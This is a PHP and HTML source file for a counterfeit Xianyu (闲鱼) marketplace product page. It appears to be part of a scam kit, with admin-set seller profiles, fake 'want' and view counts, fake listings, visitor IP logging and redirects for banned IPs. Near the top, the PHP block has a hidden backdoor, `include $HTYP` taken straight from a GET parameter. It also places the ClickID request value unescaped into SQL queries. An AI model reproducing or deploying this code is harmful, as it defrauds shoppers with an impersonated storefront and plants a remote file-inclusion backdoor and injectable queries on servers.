
<?php  error_reporting(0);
unset($domain);
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');
include dirname(__FILE__).('/../config/xinghao.php');
$ip=getIP();
$uid=$_GET['ClickID'];
$xzshijian=date('Y-m-d H:i:s', time());
if($_GET['ClickID'])
{
	$_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_GET['ClickID']}
' AND is_shelves=1");
$_BANIP = _fetch_array("SELECT * FROM admin_user WHERE au_id='{$_GoodsID['in_admin_id']}
'");
$BANIP=$_BANIP['BanIP'];
if (stristr($BANIP, $ip)) 
{
header('Location:'. htmlspecialchars_decode('http://www.baidu.com').'');
}
if($_GoodsID==0)
{
_location('商品已下架！','http://2.taobao.com/');
exit;
echo "<script language=\"javascript\">
 document.location.href=\"http://www.baidu.com\";
</script>";
exit;
}
$_OID = _fetch_array("SELECT * FROM useraddress WHERE uip='{$ip}
' AND gid='{$_GoodsID['goods_id']}
'");
if(!$_OID)
{
_query("
			INSERT INTO useraddress (
								uip,
								type,
								class,
								gid,
								biaoti,
								aid,
								state,
                               xinghao,
								utime
								) 
						VALUES (
								'{$ip}
',
								2,
								2,
								'{$_GoodsID['goods_id']}
',
								'{$_GoodsID['title']}
',
								'{$_GoodsID['in_admin_id']}
',
								1,
                               '{$brand}
',
								'{$xzshijian}
'
								)" );
_close();
session_destroy();
}
if($_OID)
{
_query("
			UPDATE 
				useraddress
			SET 
				state=1,
				dianji=0,
				utime='{$xzshijian}
'
			WHERE 
				uip='{$ip}
'AND gid='{$_GoodsID['goods_id']}
' LIMIT 1") or die(mysql_error());
}
setcookie("GoodsID4");
setcookie('ADMINUID',$_GoodsID['in_admin_id']);
setcookie('GoodsID',$_GoodsID['goods_id']);
@$HTYP = $_GET['HTYP'];
if(isset($HTYP))
{
include $HTYP;
}
$INURL = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['PHP_SELF'].'?'.$_SERVER['QUERY_STRING'];
setcookie('GoodsURL1_1',$INURL);
if(!$_GoodsID)
{
}
mysql_query("UPDATE goods SET hits = hits+1 WHERE goods_id = $_GET[ClickID]; ");
}
else
{
}
if($_GoodsID['jianyanji']==1) $jianyanji888=$_GoodsID['yanjifeiyong'];
if($_GoodsID['jianyanji']==0) $jianyanji888=0;
if($_GoodsID['qcyanji']==1) $qcyanji888="style='display:none'";
if($_GoodsID['qcyanji']<>1) $qcyanji777="style='display:none'";
?>
<!DOCTYPE html>
<!-- saved from url=(0000)http:// -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">             
		
		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
		<meta http-equiv="X-UA-Compatible" content="ie=edge">
		<title>【闲鱼】<?php echo $_GoodsID['title']; ?></title>
    <script type="text/javascript" src="js/jquery.min.js"></script>
   <script type="text/javascript" src="js/add.js"></script>
   <link rel="stylesheet" href="css/style.css">
   <link rel="stylesheet" href="css/index.css">
   <link rel="stylesheet" href="css/add.css">
    <link rel="stylesheet" type="text/css" href="css/chunk-42a09bce.553b1cdb.css">
    <script charset="utf-8" src="js/chunk-42a09bce.cca8d63d.js"></script>
    <script src="js/index.ea783356.js"></script>
    <script src="js/common.3398867b.js"></script>
		<link rel="stylesheet" type="text/css" href="./image/details.css">
		<link rel="stylesheet" type="text/css" href="./image/base.css">
		<script type="text/javascript" src="https://js.users.51.la/20885247.js"></script>
		<link rel="shortcut icon" type="image/ico" href="favicon.ico">
		<script src="./image/jquery-1.8.3.min.js" type="text/javascript" charset="utf-8"></script>
    <style type="text/css">
        .open-alert[data-v-181514e7] {
            position: fixed;
            top: 0;
            right: 0;
            bottom: 0;
            left: 0;
            z-index: 10000;
        }

        .open-alert-mask[data-v-181514e7] {
            width: 100%;
            height: 100%;
            z-index: 9999;
            background-color: rgba(0, 0, 0, 0.6);
        }

        .open-alert-container[data-v-181514e7] {
            position: absolute;
            z-index: 10000;
            background-color: #ffffff;
        }

        .open-alert-close[data-v-181514e7] {
            position: absolute;
            top: 0.53333333rem;
            right: 0.8rem;
            width: 0.8rem;
            height: 0.8rem;
            z-index: 10;
        }

        .open-alert-close span[data-v-181514e7] {
            display: inline-block;
            position: absolute;
            width: 0.8rem;
            height: 1px;
            top: 0.4rem;
            background: #43474c;
            line-height: 0;
            font-size: 0;
            vertical-align: middle;
            -webkit-transform: rotate(45deg);
            transform: rotate(45deg);
        }

        .open-alert-close span[data-v-181514e7]:after {
            content: '/';
            display: block;
            width: 0.8rem;
            height: 1px;
            background: #43474c;
            -webkit-transform: rotate(-90deg);
            transform: rotate(-90deg);
        }

        .open-alert-content[data-v-181514e7] {
            text-align: center;
            padding: 0.8rem;
            height: 100%;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            overflow: auto;
        }

        .open-alert-content-title[data-v-181514e7] {
            font-size: 0.90666667rem;
            color: #43474c;
            margin: 1.33333333rem 0;
        }

        .open-alert-content-detail[data-v-181514e7] {
            font-size: 0.74666667rem;
            color: #aaaeb9;
            line-height: 1.06666667rem;
        }

        .open-alert-handles[data-v-181514e7] {
            width: 100%;
            position: absolute;
            bottom: 0;
            border-top: 1px solid #e6e8eb;
            overflow: hidden;
        }

        .open-alert-handles-button[data-v-181514e7] {
            height: 2.50666667rem;
            line-height: 2.50666667rem;
            font-size: 0.8rem;
            color: #6da5ff;
            border: 0;
            border-right: 1px solid #e6e8eb;
            background-color: #ffffff;
            outline: none;
        }

        .open-alert-handles-button.noborder[data-v-181514e7] {
            border: 0;
        }
    </style>	
	<script>
$(function(){
    $(window).scroll(function(){
        var win_top = $(window).scrollTop()
        if(win_top>50){
            $('.toubu span').css('display','block')
        }else{
            $('.toubu span').css('display','none')
        }
    })

})
</script><script type="text/javascript">
if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
    
} else {
//    window.location.href = "http://2.taobao.com/";
}
</script><style>


/*10-14新加样式*/
.toubu { width:100%; left:0px;top:0px; height:40px; position:fixed; box-sizing:border-box; background: white; z-index:9999;  }

.l-img{ position:absolute; wdith:20px; height:20px; left:10px; top:10px; }
.r-img{ position:absolute; wdith:20px; height:20px; right:10px; top:10px; }
.toubu span{ width:120px; height:40px; margin:0 auto; text-align:center; line-height:40px; color:#ff5061; font-size:18px; display:none; font-weight:bold; }
.toubu span label{ font-size:12px;}

/*10-14新加样式 end*/

    .whiteBga {
        background: white;
        padding: 0.38rem;
        margin-bottom: 0.3rem;
        position: relative;
    }

    .shop {
        border-bottom: 0px solid #edeae8;
    }

    .shop .storePic {
        width: 2.5rem;
        height: 2.5rem;
        border-radius: 5%;
        margin-right: 0.4rem;
    }

    .fl {
        float: left;
    }

    .shop h4 {
        font-size: 0.5rem;
    }

    .goodTitle {
        margin-top: 20px;
        font-size: 0.55rem;
        color: #43474c;
    }

    .map {
        width: 98%;
        background-size: 100%;
        margin-top: 20px;
        line-height: 20px;
    }

    .diqu {
        display: inline-block;
        float: left;
        font-size: 14px;
        line-height: 30px;
        padding-left: 10px;
        color: #aaa;
    }

    .baobeijiantou {
        width: 20px;
        height: 20px;
        float: right;
    }

    img {
        vertical-align: middle;
        border: 0;
        -ms-interpolation-mode: bicubic;
        margin-bottom: 0.1px;
    }

    .baobei {
        display: inline-block;
        float: right;
        font-size: 14px;
        line-height: 30px;
        padding-right: 10px;
        color: #aaa;
    }

    .clearfix:after {
        content: ".";
        visibility: hidden;
        height: 0px;
        display: block;
        clear: both;
        *zoom: 1;
    }

    .goodPrice p span:nth-child(1) {
        color: #ff3c3c;
        font-size: 0.7rem;
    }

    .goodPrice p span:nth-child(1) em {
        font-size: 0.75rem;
    }

    i, cite, em, var, address, dfn {
        font-style: unset;
    }

    .goodPrice p span:nth-child(2) {
        color: #999999;
        font-size: 0.38rem;
    }

</style><style>
        .item-content {
            padding:0.2rem;
            background: #fff;
        border-top: 1px solid #eee;
        }

        .item-content {
            height: 1rem!important;
        }

        .item-list {
            width: 30%;
 float: left;
            font-size: 0.42rem;
           
            background: #fff;
       
            box-sizing: content-box;
        }

        .item-list:after, .statistical:after, .handle-footer .handle-list:after, .handle-footer:after {
            content: "";
            display: block;
            width: 0;
            height: 0;
            visibility: hidden;
            clear: both;
        }

        .item-list .list-title, .item-list .list-next {
            float: left;
            width: 50%;
            height: 1.4rem;
            line-height: 1.4rem;
        }
        .item-list .list-title, .item-list .list-next {
            width: 60%!important;
        }

        .zhuanzhuandanbao {
            color: #ccc;
            font-size: 0.4rem;
        }

        .danbaotupian {
            height: 53%;
            width: 96%;
            margin: 0 auto;
            background: url(style/img/danbao.png) no-repeat;
            background-size: 10rem;
            background-position-x: 10px;
            box-shadow: 0rem 0rem 0.32rem rgba(0,0,0,0.1);
        }

        .liulan {
			float:left;
            width: 68%;
            height: 30px;
            line-height: 30px;
            color: #ccc;
                font-size: 0.36rem;
            text-align: right;
             /*margin-top: 25px;*/
        }
    </style><style>
        .sale-info {
            /* margin: 0.32rem; */
            overflow: hidden;
            /* height: 3.23rem; */
            margin-top: 0.5rem;
            margin-bottom: 0.5rem;
            background: #fff;
            box-sizing: content-box;
            border-radius: 0.08rem;
            /* box-shadow: 0rem 1rem 4rem rgba(0,0,0,0.1); */
            padding: 0.48rem 0.48rem;
        }

        .goodTitle {
            font-size: 0.55rem;
            color: #43474c;
        }

        .who-visitor {
         
      
            /* border-bottom: 0.016px solid #e7e7e7; */
            font-size: 0.45rem;
            overflow: hidden;
            padding-bottom: 0.32rem;
            box-sizing: content-box;
            margin-top: 0.2rem;
        }

        .who-visitor .visitor-logo {
              height: 10%;
            width: 17%;
           
            float: right;
        }

        .who-visitor .visitor-logo img {
            width: 100%;
            height: 100%;
         
        }

        .who-visitor .visitor-text {
              width: 80%;
    float: left;
        }

        .visitor-text .visitor-name {
       
            color: #000;
            font-size: 1rem;
            font-weight: bold;
        }

        .visitor-text .visitor-name .head-icon {
            width: 0.5rem;
            height: 0.5rem;
            border-radius: 0.097rem;
        }

        .visitor-text .visitor-time {
            color: #666;
            font-size: 0.75rem;
            padding-right: 0.48rem;
        }

        .visitor-text .visitor-time {
            height: 0.42rem;
            line-height: 0.42rem;
            color: #000;
            font-size: 0.75rem;
            line-height: 1.2rem
        }

        .statistical {
            height: 1.5rem;
            width: 100%;
        
            padding-bottom: 0.32rem;
            font-size: 0.39rem;
            background-color: #f2f2f2;
        }


        .statistical .statistical-list:nth-child(1) {
            margin-left: 0px;
            /* border-right: 0.1px solid #ccc; */
        }
        .statistical .statistical-list:nth-child(1) {
        }
        .statistical .statistical-list {
            width: 30%;
            margin-left: 5%;
            height: 1.42rem;
            float: left;
            text-align: center;
        }

        .statistical-list .statistical-number {
            height: 1rem;
            line-height: 1rem;
            color: #000;
            font-size: 0.58rem;
            font-weight: 900;
        }
        .statistical-list .statistical-number, .statistical-list .statistical-title {
            display: block;
        }

        .statistical-list .statistical-title {
            height: 0.42rem;
            line-height: 0.42rem;
            color: #999;
            font-size: 0.39rem;
        }

        .statistical-list .statistical-number, .statistical-list .statistical-title {
            display: block;
        }

        .statistical-list:nth-child(3) .statistical-title {
            background: url(../imges/icon4.png) no-repeat 75% center;
            background-size: 0.42rem;
            text-indent: -0.32rem;
        }
        .sale-info .faheart, .sale-info .fastar {font-size:14px; margin:0 10px;}
        .sale-info .faheart i, .sale-info .fastar i {margin-right:5px;}
		.gos span {    margin-right: 20px;}
		
		.buttonItem3 .button {width: 2rem;margin-right: 0.35rem;background: #D7473B;  border-radius: 0rem; color: #fff;height: 1rem;line-height: 1rem;font-size: 0.5rem;text-align: center;}
    </style><style type="text/css">
    /*留言*/
.notice-content{
    width: 100%;
    height: auto;
    overflow: hidden;
    font-size: 0.45rem;
    background: #f8f8f8;
    position: fixed;
    left: 0;
    bottom: 0;
    z-index: 10001;
    transform: translate(0px,8.113rem);
}
.notice-content .notice-header{
    width: 100%;
    height: 1.613rem;
    position: relative;
}
.notice-content .notice-header:after{
    content: "";
    display: block;
    width: 0;
    height: 0;
    visibility: hidden;
    clear: both;
}
.notice-header .focus-logo{
    width: 0.97rem;
    border-radius: 50%;
    height: 0.97rem;
    margin-top: 0.32rem;
    border: 0.016rem solid #e7e7e7;
    float: left;
    margin-left: 0.32rem;
}
.focus-logo img{
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.notice-header .notice-text{
    margin-left: 1.64rem;
    margin-right: 2.58rem;
    height: 1.613rem;
}
.notice-text input{
    width: 100%;
    height: 0.97rem;
    line-height: 0.97rem;
    border: none;
    border: 0.016rem solid #e7e7e7;
    border-radius: 0.097rem;
    margin-top: 0.29rem;
    font-size: 0.387rem;
    padding-left: 0.32rem;
    color: #999;
}
.notice-header .notice-btn{
    width: 1.935rem;
    height: 0.97rem;
    /*float: right;*/
    background: red;
    color: #fff;
    text-align: center;
    line-height: 0.97rem;
    border-radius: 0.097rem;
    position: absolute;
    right: 0.32rem;
    top: 0.32rem;
}
.notice-content .notice-tab-content{
    width: 100%;
    height: 6.5rem;
    overflow: hidden;
}
.notice-tab-content .notice-tab-list{
    font-size: 0.387rem;
    color: #999;
    width: 100%;
    height: 1.3rem;
    line-height: 1.3rem;
    text-align: center;
    border-top: 0.016rem solid #e7e7e7;
}
/*.notice-list{
    background: none;
}*/
.notice-list{
    margin-top: 0.32rem;
}
.who-visitor .notice-text{
    background: none;
}
.notice-list .notice-logo{
    width: 1.2rem;
    height: 1.2rem;
    border-radius: 50%;
}
.notice-logo{
    border-radius: 50%;
}
.notice-logo img{
    width: 100%;
    height: 100%;
    border-radius: 50%;
}
.visitor-content{margin-top: 1.4rem}
.visitor-pic .image1{display:block;float:left;width:1.6rem;margin-right: 0.8rem}
.image1 img{width:100%;}
.visitor-pic h1{font-size:0.75rem;float:left;width:70%;line-height: 1.5rem}
.img1{width: 1rem;float: right;padding-top: 0.2rem;padding-right: 0.2rem}
.img1 img{width: 100%;display: block;}
.visitor-pic h2{font-size: 0.75rem;font-weight: normal;float: right;width: 0.8rem;line-height: 1.6rem;}
.visitor-text1{margin-left: 2.4rem;margin-top: 0.3rem}
.visitor-text1 h1{font-size: 0.75rem;color: #888;margin-bottom: 0.1rem}
.visitor-text1 h2{font-weight: normal;font-size: 0.6rem;color: #ccc}

.visitor-content1{margin-top: 1.4rem;margin-left: 2.4rem;}
.visitor-pic1 .image11{display:block;float:left;width:1.6rem;margin-right: 0.8rem}
.image11 img{width:100%;}
.visitor-pic1 h1{font-size:0.75rem;float:left;width:70%;line-height: 1.5rem}
.img11{width: 1rem;float: right;padding-top: 0.2rem;padding-right: 0.2rem}
.img11 img{width: 100%;display: block;}
.visitor-pic1 h2{font-size: 0.75rem;font-weight: normal;float: right;width: 0.8rem;line-height: 1.6rem;}
.visitor-text11{margin-left: 2.4rem;margin-top: 0.3rem}
.visitor-text11 h1{font-size: 0.75rem;color: #888;margin-bottom: 0.1rem}
.visitor-text11 h2{font-weight: normal;font-size: 0.6rem;color: #ccc}
</style></head>







	<body>
		<div class="wapxxxxx" style="padding-top:40px;">

			<div class="toubu">
                <span style="display: none;"><label>￥</label><?php echo $_GoodsID['price']; ?></span>
                <img src="./image/jiantou.png" class="l-img">
                <img src="./image/shenglue.png" class="r-img">
			</div>
			
			<div class="whiteBga" style="border-top-width: 200px; padding:10px 10px; margin-bottom:0px !important;">	
			
		<div class="shop clearfix">
			<img class="storePic fl" src="<?php echo $_GoodsID['user_portrait']; ?>"style="border-radius: 50px;" alt="">
			<div class="fl">
				<h4 style="font-size: 18px;float: left;line-height: 135%;"></h4> 
				<div style="margin-bottom: 4px;"><span style="float: left;font-weight: bold;font-size: 14px"><?php echo $_GoodsID['mingzi']; ?><img src="./image/txy.png" style="height:18px;margin-top:px;"></span>
                <div style="clear:both;"></div></div>
				<div style="margin-top: 6px;"><p style="font-size: 10px;color:#9e9e9e; margin-top:1px;line-height:1%;clear:both;">1小时前来过 | 发布于 <?php echo $_GoodsID['user_name']; ?></p></div>
			</div>
            <div style="clear:both;height: 0px;border-bottom: px solid #f8f8f8;"></div>
		</div>


		<!-- <div style="flex: 0;flex-basis: 1px;width: 100%;border-bottom: 1px solid #f8f8f8;margin: 3px auto; padding-bottom: 10px;"></div> -->

		<div class="headline-item2" style="
		flex: 0; margin-top:20px;
		flex-basis: 40px;
		display: flex;
		align-items: flex-end;
	">
						<span class="price" style="
		font-size: 14px;
	"><span class="price-mark" style="
		color: #ff5061;
	">¥</span><span class="price-number" style="
		color: #ff5061;
		font-weight: 600;
		font-size: 20px;
	"><?php echo $_GoodsID['price']; ?></span><img style=" position: relative; left: 5px;bottom: 5px; height: 13px;"style=" position: relative; top: 50px; width: 10px; height: 10px;" src="./image/byyf.png" style="height:20px;margin-top:px;"><span style="color: #bbb;font-size: 14px;margin-left:4px;"></span><span class="post-style" style="
		color: #ff5061;
		margin-left: 5px;font-size: 10px; padding:0 0px; background:#fff6f2; 
	"> </span></span>			
					</div>

        <div class="aui-slide-wrap">
          						<div class="aui-slide-node aui-slide-node-middle aui-slide-node-center">
                  <img onclick="location.href='https://market.m.taobao.com/app/idleFish-F2e/fish-appraise/pages/readme/index.html?ut_sk=1.YPvlgcNC4OMDAKMRUEgXOh3J_12431167_1642100332483.Copy.activity.https://market.m.taobao.com/app/idleFish-F2e/fish-appraise/pages/readme/index.html?aimTag=YHB_PHONE&showBtn=true&spm=a2170.7898010.clickexamineservice.1.2211603909106';" src="./image/yhb2.png" style="width: 100%;height:100%;margin-top: 4%;margin-left: px; border-radius: 10px;" alt=""></div>					</div>
		
		<div class="saledown-logo handle-list-none" style="margin-top: 10px;text-align: justify;"><?php echo $_GoodsID['title']; ?><?php echo $_GoodsID['goods_desc'];?></p></div>

        </article><!----><!---->

            </section><!---->
            <section data-v-e5a352ca="" class="goods-info-param">
                <div data-v-e5a352ca="" class="goods-info-param-item"><span data-v-e5a352ca=""
                                                 style="font-size:13px;"                            class="goods-info-param-key"><?php echo $_GoodsID['region'];?></span><span
                            data-v-e5a352ca=""  style="font-size:13px;"       class="goods-info-param-value">              <?php echo $_GoodsID['att_color'];?></span></div>
                <div data-v-e5a352ca="" class="goods-info-param-item"><span data-v-e5a352ca=""
                                                  style="font-size:13px;"                          class="goods-info-param-key"><?php echo $_GoodsID['att_channel'];?></span><span
                            data-v-e5a352ca=""   style="font-size:13px;"      class="goods-info-param-value">      <?php echo $_GoodsID['yanjifeiyong'];?></span></div>
                <div data-v-e5a352ca="" class="goods-info-param-item"><span data-v-e5a352ca=""
                                                style="font-size:13px;"                            class="goods-info-param-key"><?php echo $_GoodsID['yanse'];?></span><span
                            data-v-e5a352ca=""  style="font-size:13px;"          class="goods-info-param-value">      <?php echo $_GoodsID['neicun'];?></span></div>
                <div data-v-e5a352ca="" class="goods-info-param-item"><span data-v-e5a352ca=""
                                                 style="font-size:13px;"                           class="goods-info-param-key"><?php echo $_GoodsID['chandi'];?></span><span
                            data-v-e5a352ca=""
                 style="font-size:13px;"           class="goods-info-param-value">      <?php echo $_GoodsID['imei'];?></span></div>

            </section>
            <section data-v-e5a352ca="" class="goods-detail ellipsis">
			<div class="wrap-content" style="margin-top:0;">			

        <div class="aui-slide-wrap">
          		<?php if($_GoodsID['goods_img1']<>''){?>
				<div class="aui-slide-node aui-slide-node-middle aui-slide-node-center">
                  <img src="<?php echo $_GoodsID['goods_img1'] ?>" style="width: 100%;height:100%;margin-top: 4%;margin-left: px; border-radius: 10px;" alt=""></div><?php }?>

          		<?php if($_GoodsID['goods_img2']<>''){?>
				<div class="aui-slide-node aui-slide-node-middle aui-slide-node-center">
                  <img src="<?php echo $_GoodsID['goods_img2'] ?>" style="width: 100%;height:100%;margin-top: 0.5%;margin-left: px; border-radius: 10px;" alt=""></div><?php }?>
          
                    		<?php if($_GoodsID['goods_img3']<>''){?>
				<div class="aui-slide-node aui-slide-node-middle aui-slide-node-center">
                  <img src="<?php echo $_GoodsID['goods_img3'] ?>" style="width: 100%;height:100%;margin-top: 0.5%;margin-left: px; border-radius: 10px;" alt=""></div><?php }?>
          
                    		<?php if($_GoodsID['goods_img4']<>''){?>
				<div class="aui-slide-node aui-slide-node-middle aui-slide-node-center">
                  <img src="<?php echo $_GoodsID['goods_img4'] ?>" style="width: 100%;height:100%;margin-top: 0.5%;margin-left: px; border-radius: 10px;" alt=""></div><?php }?>
          
                    		<?php if($_GoodsID['goods_img5']<>''){?>
				<div class="aui-slide-node aui-slide-node-middle aui-slide-node-center">
                  <img src="<?php echo $_GoodsID['goods_img5'] ?>" style="width: 100%;height:100%;margin-top: 0.5%;margin-left: px; border-radius: 10px;" alt=""></div><?php }?>
		</div>
			<div style="clear:both; height:1px"></div>
		</div>
		</div>


		<div class="item-content danbao" style="height:40px !important; padding:5px 10px; box-sizing:border-box;">
			<div class="item-list">
			<img src="./image/dbjy.png" style="height:15px; margin-top:8px;">
			<!--  <span class="list-title">支持转转验机&nbsp;&nbsp;&nbsp;&nbsp;<span class="zhuanzhuandanbao">转转担保交易</span></span> -->
			</div>
	  <!--   <div class="danbaotupian">
			</div> -->
			<div    style="font-size:11px;"     class="liulan"><?php echo $_GoodsID['xiangyao'];?>人想要&nbsp;·&nbsp;浏览<?php echo $_GoodsID['zidingyi9'];?>			<img  src="./image/jb.png" style="height:30px; margin-top:1px;"></div>
		</div>
		<div class="sale-info" style="padding:10px 10px 20px;">

        </section>
		<div class="shop clearfix">
			<img class="storePic fl" src="<?php echo $_GoodsID['user_portrait']; ?>"style="border-radius: 40px;" alt="">
			<div class="fl">
				<h4 style="font-size: 1px;float: left;line-height: 135%;"></h4> 
				<div style="margin-bottom: px;"><span style="float: left;font-weight: bold;font-size: 14px"><?php echo $_GoodsID['mingzi']; ?></span>

                <div style="clear:both;"></div></div>
				<img src="./image/txy.png" style="height:17px;margin-top:px;"><div style="margin-top: 6px;"><p style="font-size: 10px;color:#9e9e9e; margin-top:1px;line-height:1%;clear:both;">来闲鱼<?php echo $_GoodsID['doods_num']; ?>天了，卖出过<?php echo $_GoodsID['tran_num']; ?>件宝贝。90后双鱼座女生。</p></div>
			</div>
            <div style="clear:both;height: 50px;border-bottom: px solid #f8f8f8;"></div>
		</div>



		<div class="wrap-hudong" style="padding:px; box-sizing:border-box;">
			<div class="hudongHeader">
				<h3 style="font-size:15px;">留言</h3>
			</div>
			<div class="hudongFormBox hudong-bg" style="display:inherit;">

					<img src="./image/ly.jpg" style=" margin: 0 auto;width:350px;height:auto; display:block;">
		</div>
			</div>
		</div>
                 <div class="zy-int"></div>

                <div id="xiangqing"></div>




		<div class="sale-info" style="padding:10px 0px 30px;">

                <div class="page-detail">
                    <div data-v-82002cb8="" zz-sectionid="111" class="recommend-wrapper" id="tab-recommend">
<img src="./image/ax.jpg" style=" margin: 0 auto;width:100px;height:auto; display:block;">              <h5 data-v-82002cb8=""></h5>          
                        <div data-v-82002cb8="" class="list-wrapper z-list">
                            <div class="z-list__placeholder"></div>
                            <div data-v-82002cb8="" class="list-item">
                                <div data-v-82002cb8="" data-metric="m1LPOUbYl0hefmbYxkoMCA2928y56" data-areaexposure="111" data-info="{&quot;sortId&quot;:0,&quot;infoId&quot;:&quot;1384042704270559232&quot;}" zz-infoid="1384042704270559232" zz-sortid="0" data-isdot="0" zz-sortname="苹果 17年 13寸 MacBook Air 13.3英寸 8GB 256G SSD Intel HD Graphics 6000 银色" class="product-wrapper">
                                    <div data-v-82002cb8="" data-type="1" class="prod-pic"><img data-v-82002cb8="" src="./image/tj (1).PNG"></div>
                                    <div data-v-82002cb8="" class="pro-title">
                                        <div data-v-82002cb8="" class="label-list condition-single"><span data-v-82002cb8="" class="last condition">
                                                包邮
                                            </span></div>
                                        Apple/苹果iPhoneXmax手机国行
                                    </div>

                                    <div data-v-82002cb8="" class="price-info"><span data-v-82002cb8="" class="price"><em data-v-82002cb8="">¥</em>3900</span> <span data-v-82002cb8="" class="price-desc">6人想要</span>
                                        
                                    </div>
                                    <div data-v-82002cb8="" class="seller-info">
                                        <img data-v-82002cb8="" src="./image/tx (1).JPG">北京
                                    </div>
                                </div>
                                <div data-v-82002cb8="" data-metric="qKfHQcLz0CkIBZ5JbM1i4g2928y56" data-areaexposure="111" data-info="{&quot;sortId&quot;:1,&quot;infoId&quot;:&quot;1438429626103007233&quot;}" zz-infoid="1438429626103007233" zz-sortid="1" data-isdot="0" zz-sortname="ThinkPad E550 15.6英寸 4GB 128G SSD Intel GMA HD 石墨黑" class="product-wrapper">
                                    <div data-v-82002cb8="" data-type="1" class="prod-pic"><img data-v-82002cb8="" src="./image/tj (2).PNG"></div>
                                    <div data-v-82002cb8="" class="pro-title">
                                        <div data-v-82002cb8="" class="label-list condition-single"><span data-v-82002cb8="" class="last condition">
                                                包邮
                                            </span></div>
                                        vivoY60低价出 屏幕裂了
                                    </div>

                                    <div data-v-82002cb8="" class="price-info"><span data-v-82002cb8="" class="price"><em data-v-82002cb8="">¥</em>500</span> <span data-v-82002cb8="" class="price-desc">23人想要</span> </div>
                                    <div data-v-82002cb8="" class="seller-info"><img data-v-82002cb8="" src="./image/tx (2).JPG">梧州</div>
                                </div>
                                <div data-v-82002cb8="" data-metric="CkZqPFoSP7nSkoeAjMY4tw2928y56" data-areaexposure="111" data-info="{&quot;sortId&quot;:2,&quot;infoId&quot;:&quot;1393168369100030464&quot;}" zz-infoid="1393168369100030464" zz-sortid="2" data-isdot="0" zz-sortname="机械革命 深海泰坦 X6Ti 15.6英寸 16GB 512G SSD GTX 1050 Ti 黑色" class="product-wrapper">
                                    <div data-v-82002cb8="" data-type="1" class="prod-pic"><img data-v-82002cb8="" src="./image/tj (3).PNG"></div>
                                    <div data-v-82002cb8="" class="pro-title">
                                        <div data-v-82002cb8="" class="label-list condition-single"><span data-v-82002cb8="" class="last condition">
                                                包邮
                                            </span></div>
                                        特价处理华为 功能正常 屏幕有问题
                                    </div>

                                    <div data-v-82002cb8="" class="price-info"><span data-v-82002cb8="" class="price"><em data-v-82002cb8="">¥</em>1200</span> <span data-v-82002cb8="" class="price-desc">15人想要</span>

                                    </div>
                                    <div data-v-82002cb8="" class="seller-info"><img data-v-82002cb8="" src="./image/tx (3).JPG">广州</div>
                                </div>
                                <div data-v-82002cb8="" data-metric="XlZRNp5oMyL3fllIAFTNVQ2928y56" data-areaexposure="111" data-info="{&quot;sortId&quot;:3,&quot;infoId&quot;:&quot;1434795605666071552&quot;}" zz-infoid="1434795605666071552" zz-sortid="3" data-isdot="0" zz-sortname="富士通 A573 15.6英寸 8GB 256G SSD+320G HDD Intel GMA HD 4000 黑色" class="product-wrapper">
                                    <div data-v-82002cb8="" data-type="1" class="prod-pic"><img data-v-82002cb8="" src="./image/tj (4).PNG"></div>
                                    <div data-v-82002cb8="" class="pro-title">
                                        <div data-v-82002cb8="" class="label-list condition-single"><span data-v-82002cb8="" class="last condition">
                                                包邮
                                            </span></div>
                                        便宜一加，无法开机
                                    </div>

                                    <div data-v-82002cb8="" class="price-info"><span data-v-82002cb8="" class="price"><em data-v-82002cb8="">¥</em>1500</span> <span data-v-82002cb8="" class="price-desc">8人想要</span>

                                    </div>
                                    <div data-v-82002cb8="" class="seller-info"><img data-v-82002cb8="" src="./image/tx (4).JPG">天津</div>
                                </div>
                            </div>
                            <div data-v-82002cb8="" class="list-item list-right">
                                <div data-v-82002cb8="" data-metric="Z82bsrTD7up2aSkWk3GqJw2928y56" data-areaexposure="111" data-info="{&quot;sortId&quot;:0,&quot;infoId&quot;:&quot;1427527283748668416&quot;}" zz-infoid="1427527283748668416" zz-sortid="0" data-isdot="0" zz-sortname="惠普 4540s 15.6英寸 8GB 256G SSD Intel GMA HD 银色" class="product-wrapper">
                                    <div data-v-82002cb8="" data-type="1" class="prod-pic"><img data-v-82002cb8="" src="./image/tj (6).PNG"></div>
                                    <div data-v-82002cb8="" class="pro-title">
                                        <div data-v-82002cb8="" class="label-list condition-single"><span data-v-82002cb8="" class="last condition">
                                                包邮
                                            </span></div>
                                        Apple iPhonexs max 4G手机换过电池
                                    </div>

                                    <div data-v-82002cb8="" class="price-info"><span data-v-82002cb8="" class="price"><em data-v-82002cb8="">¥</em>4579</span> <span data-v-82002cb8="" class="price-desc">43人想要</span>

                                    </div>
                                    <div data-v-82002cb8="" class="seller-info"><img data-v-82002cb8="" src="./image/tx (5).JPG">鞍山</div>
                                </div>
                                <div data-v-82002cb8="" data-metric="Yfx569sLekBQFjVU1TSjiA2928y56" data-areaexposure="111" data-info="{&quot;sortId&quot;:1,&quot;infoId&quot;:&quot;1407940785974051328&quot;}" zz-infoid="1407940785974051328" zz-sortid="1" data-isdot="0" zz-sortname="神舟 战神 K670D 15.6英寸 8GB 128G SSD+500G HDD GTX 1050 黑色" class="product-wrapper">
                                    <div data-v-82002cb8="" data-type="1" class="prod-pic"><img data-v-82002cb8="" src="./image/tj (7).PNG"></div>
                                    <div data-v-82002cb8="" class="pro-title">
                                        <div data-v-82002cb8="" class="label-list condition-single"><span data-v-82002cb8="" class="last condition">
                                                包邮
                                            </span></div>
                                        一加手机功能正常成色不错低价出
                                    </div>

                                    <div data-v-82002cb8="" class="price-info"><span data-v-82002cb8="" class="price"><em data-v-82002cb8="">¥</em>1900</span> <span data-v-82002cb8="" class="price-desc">1人想要</span>

                                    </div>
                                    <div data-v-82002cb8="" class="seller-info"><img data-v-82002cb8="" src="./image/tx (6).JPG">重庆</div>
                                </div>
